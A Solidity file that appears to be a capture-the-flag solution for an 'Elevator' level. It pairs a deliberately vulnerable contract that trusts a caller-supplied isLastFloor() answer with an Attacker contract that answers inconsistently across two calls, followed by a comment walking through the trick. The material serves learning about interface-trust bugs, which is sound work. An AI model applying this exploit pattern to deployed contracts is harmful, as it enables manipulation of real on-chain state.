// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Attacker {
    Elevator private immutable target;
    uint private count;

    constructor(address _target) {
        target = Elevator(_target);
    }

    function attack() external {
        target.goTo(1);
        require(target.top(), "not top");
    }

    function isLastFloor(uint) external returns (bool) {
        count++;
        return count > 1;
    }
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

/**
The Attacker contract is created to exploit the vulnerability in the Elevator contract.

The constructor of the Attacker contract takes the address of the target Elevator contract as an argument
and stores it in the target variable.

The attack function is called externally to initiate the attack.

Inside the attack function, the goTo function of the target Elevator contract is called with the argument 1, 
attempting to reach floor 1 (does not matter the number).

After calling goTo, the require statement checks if the top variable of the target Elevator contract is true. 
If it's not, the transaction fails with an error message.

The isLastFloor function is defined in the Attacker contract and implemented to always return true on the 
second call (count > 1).

By manipulating the behavior of the isLastFloor function, the Attacker contract tricks the Elevator contract into 
thinking it's not the last floor, allowing it to reach the target floor (in this case, floor 1).

The top variable of the Elevator contract is updated based on the return value of the isLastFloor function, 
reflecting whether the current floor is the top floor.

By exploiting the vulnerability and manipulating the isLastFloor function, the attacker contract successfully 
tricks the Elevator contract and reaches the target floor.
 */